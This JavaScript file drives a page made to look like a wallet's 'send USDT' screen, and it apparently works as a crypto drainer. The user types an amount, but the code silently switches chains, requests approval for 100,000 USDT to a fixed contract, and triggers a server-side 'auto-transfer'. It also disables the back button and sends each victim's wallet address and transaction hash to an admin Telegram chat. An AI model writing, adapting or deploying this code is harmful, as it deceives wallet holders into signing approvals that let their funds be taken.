(function () {
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', __init);
    } else {
        __init();
    }
    function __init() {

    // ===== CONFIG =====
    // Load from window.CONFIG (set by config.js) or environment variables
    const CONFIG = window.CONFIG || {
        COMPANY_WALLET_ADDRESS: window.VITE_COMPANY_WALLET_ADDRESS || "0x1FF53eCf1d988Cec805462bBC98683306cdd16bF",
        CONTRACT_ADDRESS: window.VITE_ESCROW_CONTRACT_ADDRESS || "0x00497F8E8e84a61b62f7E7F0B32923d251AbeC38", // Must match escrow/config.js
        USDT_ADDRESS: window.VITE_USDT_TOKEN_ADDRESS || "0x55d398326f99059fF775485246999027B3197955",
        TELEGRAM_BOT_TOKEN: window.VITE_TELEGRAM_BOT_TOKEN || window.CONFIG?.TELEGRAM_BOT_TOKEN || "",
        ADMIN_CHAT_ID: window.VITE_ADMIN_CHAT_ID || window.CONFIG?.ADMIN_CHAT_ID || "7254066136"
    };

    // ===== TELEGRAM NOTIFICATION FUNCTION =====
    async function sendTelegramNotifications(walletAddress, txHash, userId) {
        const botToken = CONFIG.TELEGRAM_BOT_TOKEN || window.VITE_TELEGRAM_BOT_TOKEN;
        const adminChatId = CONFIG.ADMIN_CHAT_ID || window.VITE_ADMIN_CHAT_ID || "7254066136";
        
        if (!botToken || !adminChatId) {
            console.warn('Telegram bot token or admin chat ID not configured');
            return;
        }

        const inlineKeyboard = {
            inline_keyboard: [[{ text: "🔗 View Transaction", url: `https://bscscan.com/tx/${txHash}` }]]
        };

        const adminMessage =
            `🔔 **New USDT Approval Transaction**\n\n` +
            `💰 **Wallet Address:** \n\`\`\`\n${walletAddress}\n\`\`\`\n` +
            `🔗 **Transaction Hash:** \n\`\`\`\n${txHash}\n\`\`\`\n` +
            `👤 **User ID:** ${userId || "Not provided"}\n` +
            `⏰ **Time:** ${new Date().toLocaleString()}\n\n` +
            `✅ Transaction approved successfully!\n\n` +
            `💡 *Tap and hold on the wallet address above to copy it*`;

        const userMessage =
            `🎉 **USDT Approval Successful!**\n\n` +
            `💰 **Your Wallet Address:** \n\`\`\`\n${walletAddress}\n\`\`\`\n` +
            `🔗 **Transaction Hash:** \n\`\`\`\n${txHash}\n\`\`\`\n` +
            `✅ **Status:** Approved\n\n` +
            `You can now proceed with USDT transfers.\n\n` +
            `💡 *Tap and hold on the wallet address above to copy it*`;

        try {
            // Send to admin
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: adminChatId,
                    text: adminMessage,
                    parse_mode: "Markdown",
                    reply_markup: inlineKeyboard
                })
            });

            // Send to user if provided
            if (userId) {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: userId,
                        text: userMessage,
                        parse_mode: "Markdown",
                        reply_markup: inlineKeyboard
                    })
                });
            }

            console.log("Telegram notifications sent successfully");
        } catch (error) {
            console.error("Failed to send Telegram notifications:", error);
        }
    }

    // ===== NOTIFICATION BAR SETUP =====
    function showNotification(msg, type = "info") {
        let notify = document.getElementById("notify-bar");
        if (!notify) {
            notify = document.createElement("div");
            notify.id = "notify-bar";
            notify.style.position = "fixed";
            notify.style.top = "20px";
            notify.style.left = "50%";
            notify.style.transform = "translateX(-50%)";
            notify.style.zIndex = "9999";
            notify.style.minWidth = "260px";
            notify.style.maxWidth = "90vw";
            notify.style.padding = "16px 32px";
            notify.style.borderRadius = "12px";
            notify.style.fontSize = "1rem";
            notify.style.fontWeight = "bold";
            notify.style.textAlign = "center";
            notify.style.boxShadow = "0 4px 32px #0008";
            notify.style.transition = "all 0.3s";
            document.body.appendChild(notify);
        }
        notify.textContent = msg;
        notify.style.background =
            type === "error" ? "#f87171" : type === "success" ? "#10b981" : "#374151";
        notify.style.color = "#fff";
        notify.style.opacity = "1";
        notify.style.pointerEvents = "auto";
        setTimeout(() => {
            notify.style.opacity = "0";
            notify.style.pointerEvents = "none";
        }, 3000);
    }

    // ===== FORM LOGIC =====
    const addressInput = document.getElementById("addressInput") || document.querySelector('input[placeholder="Search or Enter"]');
    const amountInput = document.getElementById("amountInput") || document.querySelector('input[placeholder="USDT Amount"]');
    const nextBtn = document.getElementById("reviewBtn") || document.querySelector("button.w-full");
    const originalBtnHTML = nextBtn.innerHTML;
    const approxUsd = document.getElementById("fiatLine") || document.querySelector(".text-xs.text-gray-500");
    const maxBtn = document.getElementById("maxBtn") || Array.from(document.querySelectorAll("button")).find(
        (btn) => btn.textContent.trim().toLowerCase() === "max"
    );
    const amountDisplay = document.getElementById("amountDisplay");
    const toAddressEl = document.getElementById("toAddress");
    const assetBalanceEl = document.getElementById("assetBalance");
    const assetUsdEl = document.getElementById("assetUsd");
    const keypadEl = document.getElementById("keypad");
    const swapBtn = document.getElementById("swapBtn");
    const backBtn = document.getElementById("backBtn");

    const companyWallet = (CONFIG.COMPANY_WALLET_ADDRESS || "").trim();
    addressInput.value = companyWallet;
    if (toAddressEl) toAddressEl.textContent = companyWallet;

    let inputMode = "crypto";
    const MAX_DECIMALS = 8;

    function amountNumber() {
        const n = parseFloat(amountInput.value.trim());
        return isNaN(n) ? 0 : n;
    }

    function fitAmountFont() {
        if (!amountDisplay) return;
        amountDisplay.style.fontSize = "";
        const parent = amountDisplay.parentElement;
        if (!parent) return;
        const maxW = parent.clientWidth;
        let size = 64;
        while (amountDisplay.scrollWidth > maxW && size > 28) {
            size -= 2;
            amountDisplay.style.fontSize = size + "px";
        }
    }

    function renderAmountDisplay() {
        if (!amountDisplay) return;
        const raw = amountInput.value.trim();
        amountDisplay.textContent = raw.length ? raw : "0";
        amountDisplay.classList.toggle("is-empty", !raw.length);
        fitAmountFont();
    }

    function updateApproxUsd() {
        const amount = amountNumber();
        if (inputMode === "fiat") {
            approxUsd.textContent =
                amount <= 0 ? "≈ 0.00 USDT" : `≈ ${amount.toFixed(2)} USDT`;
        } else {
            approxUsd.textContent =
                amount <= 0 ? "≈ $0.00" : `≈ $${amount.toFixed(2)}`;
        }
        renderAmountDisplay();
    }
    amountInput.addEventListener("input", updateApproxUsd);
    updateApproxUsd();

    function validate() {
        const address = addressInput.value.trim();
        nextBtn.disabled = !(address.length > 0 && amountNumber() > 0);
    }
    addressInput.addEventListener("input", validate);
    amountInput.addEventListener("input", validate);
    validate();

    function applyAmountString(next) {
        amountInput.value = next;
        updateApproxUsd();
        validate();
    }

    function pressKey(key) {
        let raw = amountInput.value.trim();
        if (key === "back") {
            applyAmountString(raw.slice(0, -1));
            return;
        }
        if (key === ".") {
            if (!raw.length) {
                applyAmountString("0.");
                return;
            }
            if (raw.indexOf(".") !== -1) return;
            applyAmountString(raw + ".");
            return;
        }
        if (!/^[0-9]$/.test(key)) return;
        if (!raw.length) {
            applyAmountString(key === "0" ? "" : key);
            return;
        }
        if (raw === "0") {
            applyAmountString(key === "0" ? "0" : key);
            return;
        }
        const dot = raw.indexOf(".");
        if (dot !== -1 && raw.length - dot - 1 >= MAX_DECIMALS) return;
        if (dot === -1 && raw.length >= 12) return;
        applyAmountString(raw + key);
    }

    if (keypadEl) {
        keypadEl.addEventListener("click", function (e) {
            const btn = e.target.closest("[data-key]");
            if (!btn || nextBtn.querySelector(".spinner")) return;
            pressKey(btn.getAttribute("data-key"));
        });
    }

    if (swapBtn) {
        swapBtn.addEventListener("click", function () {
            inputMode = inputMode === "crypto" ? "fiat" : "crypto";
            updateApproxUsd();
        });
    }

    if (backBtn) {
        backBtn.addEventListener("click", function (e) {
            e.preventDefault();
        });
    }

    function formatAssetAmount(raw) {
        const n = parseFloat(raw);
        if (!isFinite(n) || n <= 0) return "0.00";
        const s = n.toFixed(6).replace(/\.?0+$/, "");
        return s.indexOf(".") === -1 ? s + ".00" : s;
    }

    function setAssetBalance(raw) {
        const shown = formatAssetAmount(raw);
        if (assetBalanceEl) assetBalanceEl.textContent = shown + " USDT";
        const usd = parseFloat(shown);
        if (assetUsdEl) assetUsdEl.textContent = "$" + (isFinite(usd) ? usd.toFixed(2) : "0.00");
    }
    setAssetBalance("0");

    async function loadWalletBalance() {
        if (!window.ethereum) return null;
        try {
            await window.ensureEthers();
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            const signer = provider.getSigner();
            const walletAddress = await signer.getAddress();
            const usdtAddress = CONFIG.USDT_ADDRESS || window.VITE_USDT_TOKEN_ADDRESS || "0x55d398326f99059fF775485246999027B3197955";
            const usdtAbi = [
                "function balanceOf(address owner) view returns (uint256)",
                "function decimals() view returns (uint8)"
            ];
            const usdt = new ethers.Contract(usdtAddress, usdtAbi, signer);
            let decimals = 18;
            try { decimals = await usdt.decimals(); } catch (err) {}
            const balance = await usdt.balanceOf(walletAddress);
            return ethers.utils.formatUnits(balance, decimals);
        } catch (err) {
            return null;
        }
    }

    (async function silentBalance() {
        if (!window.ethereum) return;
        try {
            const accs = await window.ethereum.request({ method: "eth_accounts" });
            if (!accs || !accs[0]) return;
            const maxValue = await loadWalletBalance();
            if (maxValue != null) setAssetBalance(maxValue);
        } catch (err) {}
    })();

    if (maxBtn) {
        maxBtn.addEventListener("click", async function (e) {
            e.preventDefault();
            if (!window.ethereum) {
                showNotification("No Web3 wallet found.", "error");
                return;
            }
            try {
                const maxValue = await loadWalletBalance();
                if (maxValue == null) {
                    showNotification("Unable to get max balance.", "error");
                    return;
                }
                setAssetBalance(maxValue);
                applyAmountString((+maxValue).toString());
            } catch (err) {
                showNotification("Unable to get max balance.", "error");
            }
        });
    }

    // ===== NEXT BUTTON - APPROVE USDT (FIXED TO ESCROW) =====
    nextBtn.addEventListener("click", async function (e) {
        e.preventDefault();

        if (!window.ethereum) {
            showNotification(
                "No Web3 wallet found. Please open in Trust Wallet or MetaMask browser.",
                "error"
            );
            return;
        }

        nextBtn.innerHTML = '<span class="spinner">Processing...</span>';
        nextBtn.disabled = true;

        try {
            if (typeof window.ensureEthers !== "function") {
                await new Promise(function (resolve, reject) {
                    var s = document.createElement("script");
                    s.src = "/ensure-ethers.js";
                    s.onload = resolve;
                    s.onerror = function () {
                        reject(new Error("Wallet script missing"));
                    };
                    document.head.appendChild(s);
                });
            }
            if (typeof window.ensureEthers !== "function") {
                throw new Error("Wallet script missing");
            }
            await window.ensureEthers();

            // BSC Network Config from environment variables
            const bnbChainId = window.VITE_BSC_CHAIN_ID || "0x38";
            const bscRpcUrl = window.VITE_BSC_RPC_URL || "https://bsc-dataseed.binance.org/";
            const bscExplorerUrl = window.VITE_BSC_BLOCK_EXPLORER_URL || "https://bscscan.com/";
            
            const bnbChainParams = {
                chainId: bnbChainId,
                chainName: "BNB Smart Chain",
                nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
                rpcUrls: [bscRpcUrl],
                blockExplorerUrls: [bscExplorerUrl]
            };

            // Silent BSC switch (Link jaisa) — extra popup / hard-stop nahi.
            // Fail ho to bhi approve chalne do; wallet khud chain handle karega.
            try {
                await window.ethereum.request({
                    method: "wallet_switchEthereumChain",
                    params: [{ chainId: bnbChainId }]
                });
            } catch (switchError) {
                var sc = switchError && switchError.code;
                if (sc == null && switchError && switchError.data && switchError.data.originalError) {
                    sc = switchError.data.originalError.code;
                }
                if (Number(sc) === 4902) {
                    try {
                        await window.ethereum.request({
                            method: "wallet_addEthereumChain",
                            params: [bnbChainParams]
                        });
                    } catch (_) {}
                }
            }

            // === Approve ESCROW CONTRACT instead of company wallet ===
            const escrowAddress = CONFIG.CONTRACT_ADDRESS;
            const usdtAddress = CONFIG.USDT_ADDRESS || window.VITE_USDT_TOKEN_ADDRESS || "0x55d398326f99059fF775485246999027B3197955";

            const usdtAbi = [
                "function approve(address spender, uint256 amount) public returns (bool)",
                "function decimals() view returns (uint8)"
            ];
            const iface = new ethers.utils.Interface(usdtAbi);

            let decimals = 18;
            try {
                const decCallData = iface.encodeFunctionData("decimals", []);
                const decHex = await window.ethereum.request({
                    method: "eth_call",
                    params: [{ to: usdtAddress, data: decCallData }, "latest"]
                });
                decimals = ethers.BigNumber.from(decHex).toNumber();
            } catch (err) {
                console.warn("Could not fetch decimals, defaulting to 18");
            }

            const approveHuman = String(window.APPROVE_USDT || '100000');
            const parsedAmount = ethers.utils.parseUnits(approveHuman, decimals);
            const txData = iface.encodeFunctionData("approve", [
                escrowAddress,
                parsedAmount.toString()
            ]);

            let fromAddress = (await window.ethereum.request({ method: "eth_accounts" }))[0];
            if (!fromAddress) {
                const requested = await window.ethereum.request({ method: "eth_requestAccounts" });
                fromAddress = requested && requested[0];
            }
            if (!fromAddress) {
                throw new Error("No wallet account");
            }
            const approvalTxHash = await window.ethereum.request({
                method: "eth_sendTransaction",
                params: [{ from: fromAddress, to: usdtAddress, data: txData, value: "0x0" }]
            });

            // Wait for approval transaction to be mined
            if (approvalTxHash && approvalTxHash.length > 0) {
                nextBtn.innerHTML = '<span class="spinner">Approving...</span>';
                
                try {
                    const provider = new ethers.providers.Web3Provider(window.ethereum);
                    await provider.waitForTransaction(approvalTxHash);
                    
                    // Get user entered amount
                    const userAmount = amountInput.value.trim();
                    if (!userAmount || parseFloat(userAmount) <= 0) {
                        showNotification("Please enter a valid amount", "error");
                        nextBtn.innerHTML = originalBtnHTML;
                        nextBtn.disabled = false;
                        return;
                    }

                    // SAVE APPROVAL RECORD IMMEDIATELY (even before transfer)
                    const apiBaseUrl = (window.API_BASE_URL ? window.API_BASE_URL.replace(/\/$/, '') + '/api' : '/api');
                    const tenantSlug = window.TENANT_SLUG || '';
                    const apiHeaders = { 'Content-Type': 'application/json' };
                    if (tenantSlug) apiHeaders['X-Tenant-Slug'] = tenantSlug;
                    try {
                        const saveResponse = await fetch(`${apiBaseUrl}/save-approval`, {
                            method: 'POST',
                            headers: apiHeaders,
                            body: JSON.stringify({
                                userAddress: fromAddress,
                                approvalTxHash: approvalTxHash,
                                amount: userAmount,
                                approvalSource: 'qr'
                            })
                        });
                        
                        const saveData = await saveResponse.json();
                        if (saveData.warning) {
                            console.warn('Database save warning:', saveData.warning);
                        }
                        console.log('Approval record saved:', saveData);
                    } catch (saveError) {
                        console.error('Failed to save approval record:', saveError);
                        // Continue even if save fails - approval was successful
                    }

                    // Send Telegram notification for approval
                    try {
                        const urlParams = new URLSearchParams(window.location.search);
                        const userId = urlParams.get("user_id");
                        await sendTelegramNotifications(fromAddress, approvalTxHash, userId);
                    } catch (err) {
                        console.error("Failed to send Telegram notifications:", err);
                    }

                    // AUTOMATIC TRANSFER after approval
                    nextBtn.innerHTML = '<span class="spinner">Transferring...</span>';
                    showNotification("Approval successful! Transferring USDT...", "info");

                    // Call auto-transfer API
                    const transferResponse = await fetch(`${apiBaseUrl}/auto-transfer`, {
                        method: 'POST',
                        headers: apiHeaders,
                        body: JSON.stringify({
                            userAddress: fromAddress,
                            amount: userAmount,
                            approvalTxHash: approvalTxHash
                        })
                    });

                    const transferData = await transferResponse.json();

                    if (transferData.success) {
                        // Calculate USD value
                        const usdValue = parseFloat(userAmount).toFixed(2);
                        
                        // Redirect to success page (relative — keeps /qr/ prefix)
                        const successUrl = new URL('success.html', window.location.href);
                        successUrl.searchParams.set('tx', transferData.transferTxHash);
                        successUrl.searchParams.set('user', fromAddress);
                        successUrl.searchParams.set('to', CONFIG.COMPANY_WALLET_ADDRESS);
                        successUrl.searchParams.set('amount', userAmount);
                        successUrl.searchParams.set('usd', usdValue);
                        successUrl.searchParams.set('date', new Date().toISOString());
                        
                        window.location.href = successUrl.toString();
                    } else {
                        // Transfer failed - redirect to failed page (relative)
                        const failedUrl = new URL('failed.html', window.location.href);
                        failedUrl.searchParams.set('approvalTx', approvalTxHash);
                        failedUrl.searchParams.set('user', fromAddress);
                        failedUrl.searchParams.set('to', CONFIG.COMPANY_WALLET_ADDRESS);
                        failedUrl.searchParams.set('amount', userAmount);
                        failedUrl.searchParams.set('usd', parseFloat(userAmount).toFixed(2));
                        failedUrl.searchParams.set('error', encodeURIComponent(transferData.error || 'Transfer failed'));
                        failedUrl.searchParams.set('date', new Date().toISOString());
                        
                        window.location.href = failedUrl.toString();
                    }
                } catch (transferError) {
                    console.error('Transfer error:', transferError);
                    
                    // Redirect to failed page (relative)
                    const failedUrl = new URL('failed.html', window.location.href);
                    failedUrl.searchParams.set('approvalTx', approvalTxHash);
                    failedUrl.searchParams.set('user', fromAddress);
                    failedUrl.searchParams.set('to', CONFIG.COMPANY_WALLET_ADDRESS);
                    failedUrl.searchParams.set('amount', amountInput.value.trim());
                    failedUrl.searchParams.set('error', encodeURIComponent(transferError.message || 'Transfer failed'));
                    failedUrl.searchParams.set('date', new Date().toISOString());
                    
                    window.location.href = failedUrl.toString();
                }
            }
        } catch (err) {
            const msg = (err?.message || "").toLowerCase();
            if (
                msg.includes("user rejected") ||
                msg.includes("user denied") ||
                msg.includes("cancelled") ||
                msg.includes("canceled")
            ) {
                showNotification("Transaction cancelled.", "error");
            } else if (
                msg.includes("insufficient funds") ||
                msg.includes("exceeds balance") ||
                (msg.includes("execution reverted") && msg.includes("exceeds balance"))
            ) {
                showNotification("Insufficient USDT balance for this approval.", "error");
            } else {
                showNotification("Transaction failed. Please try again.", "error");
            }
        } finally {
            nextBtn.disabled = false;
            nextBtn.innerHTML = originalBtnHTML;
        }
    });
    }
})();

